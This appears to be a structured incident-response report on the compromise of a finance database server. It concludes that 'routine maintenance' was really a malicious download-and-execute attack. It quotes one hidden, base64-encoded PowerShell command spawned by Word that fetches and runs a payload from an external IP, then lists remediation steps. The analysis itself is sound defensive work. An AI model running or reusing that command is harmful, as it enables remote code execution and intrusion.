digest: Initial assessment of 'routine maintenance' was incorrect. Evidence indicates a malicious PowerShell execution on FIN-DB-02, likely initiated by winword.exe, which downloaded and executed a payload from an external IP (203.0.113.77). Subsequent persistent outbound connections to this IP suggest Command and Control activity. The maintenance team confirmed no authorized activity on the host. This is a critical compromise requiring immediate action.

evidence_findings.title: Malicious PowerShell Execution on FIN-DB-02
evidence_findings.subject: FIN-DB-02
evidence_findings.evidence: A hidden PowerShell process ('powershell.exe -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA') was executed, parented by 'winword.exe'. The decoded command invokes Net.WebClient to download and execute 'hxxps://203.0.113.77/update.dat'.
evidence_findings.conclusion: Unauthorized and malicious code execution occurred on the database server FIN-DB-02, indicating a compromise.

evidence_findings.title: Unauthorized Outbound Network Connection to Malicious IP
evidence_findings.evidence: Persistent outbound connections from 10.20.8.42 (FIN-DB-02) to 203.0.113.77 on port 443 were observed immediately after the PowerShell execution. The destination IP is not on the corporate allowlist.
evidence_findings.conclusion: The network connections are indicative of Command and Control (C2) communication or data exfiltration to an external malicious entity.

evidence_findings.title: Activity Not Associated with Approved Maintenance
evidence_findings.subject: FIN-DB-02
evidence_findings.evidence: The maintenance team confirmed they performed no work on FIN-DB-02, and no approved change references the observed PowerShell command or the destination IP 203.0.113.77.
evidence_findings.conclusion: The observed activity is unauthorized and not part of any legitimate maintenance, contradicting the initial case classification.

attack_chain.description: Malicious activity initiated via 'winword.exe' launching a hidden PowerShell process.
Encoded PowerShell script executed on FIN-DB-02 to download and execute a payload.
Payload downloaded from 'hxxps://203.0.113.77/update.dat' and persistent outbound connections established to '203.0.113.77:443'.

attack_timeline.attack_behavior: Malicious PowerShell execution detected on FIN-DB-02, parented by winword.exe.

ioc_indicators.context: Internal IP address of the compromised host FIN-DB-02.
Parent process of the malicious PowerShell, suggesting initial access vector.

remediations.description: Immediately isolate FIN-DB-02 from the network to prevent further compromise or lateral movement.
Conduct a thorough forensic analysis of FIN-DB-02 to identify and remove all malicious artifacts, including the downloaded payload and any persistence mechanisms.
Block all traffic to and from IP address 203.0.113.77 at the perimeter firewall and internal network controls.
Search for similar PowerShell execution patterns, network connections to 203.0.113.77, or 'winword.exe' spawning PowerShell across the environment.
Review and update incident response and change management procedures to prevent misclassification of critical security alerts as benign maintenance.

unknowns: The exact initial infection vector that led to 'winword.exe' launching the malicious PowerShell process.
The specific functionality and capabilities of the 'update.dat' payload downloaded from 203.0.113.77.
The full scope of compromise on FIN-DB-02, including data exfiltration or further system modifications.
Whether other systems within the environment have been similarly compromised or targeted.
